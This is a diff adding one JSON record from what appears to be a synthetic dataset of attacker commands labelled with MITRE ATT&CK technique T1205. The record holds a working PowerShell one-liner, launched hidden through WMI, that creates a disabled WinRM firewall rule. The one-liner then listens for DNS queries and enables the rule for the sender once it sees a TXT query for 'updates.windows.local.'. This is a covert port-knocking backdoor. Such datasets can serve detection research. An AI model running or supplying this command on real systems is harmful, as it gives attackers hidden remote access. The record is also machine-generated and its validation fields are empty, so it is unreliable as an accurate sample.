@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1205",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'powershell -NoP -W Hidden -Command & { if (-not (Get-NetFirewallRule -DisplayName ''Signal-Open-WinRM-HTTP-TXT'' -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName ''Signal-Open-WinRM-HTTP-TXT'' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 5985 -Enabled False } else { Set-NetFirewallRule -DisplayName ''Signal-Open-WinRM-HTTP-TXT'' -Enabled False }; $u=New-Object System.Net.Sockets.UdpClient(53); $ep=New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any,0); while($true){ $d=$u.Receive([ref]$ep); if($d.Length -gt 20){ $p=12; $n=''; while($p -lt $d.Length){ $l=$d[$p]; if($l -eq 0){$p++; break}; $p++; $n += [Text.Encoding]::ASCII.GetString($d,$p,$l)+''.''; $p+=$l }; if($n -eq ''updates.windows.local.''){ $qt=($d[$p]*256)+$d[$p+1]; if($qt -eq 16){ Set-NetFirewallRule -DisplayName ''Signal-Open-WinRM-HTTP-TXT'' -Enabled True -RemoteAddress $ep.Address; break } } } } }'",
+  "explanation": "Parses DNS on UDP/53 to detect a TXT query for 'updates.windows.local.' (application-specific DNS wire format: QNAME/QTYPE=TXT). On match, enables a Windows Firewall rule for WinRM HTTP (5985), scoping to the signaled source.",
+  "rationale_steps": [
+    "Create disabled firewall rule for TCP/5985.",
+    "Listen on UDP/53 and parse DNS header/question to extract QNAME and QTYPE.",
+    "If QNAME matches and QTYPE=TXT (16), enable rule and restrict to source IP."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1205-5411a282-998bf583",
+  "source_prompt_hash": "5411a282",
+  "timestamp_utc": "2025-09-30T03:46:23.408122Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
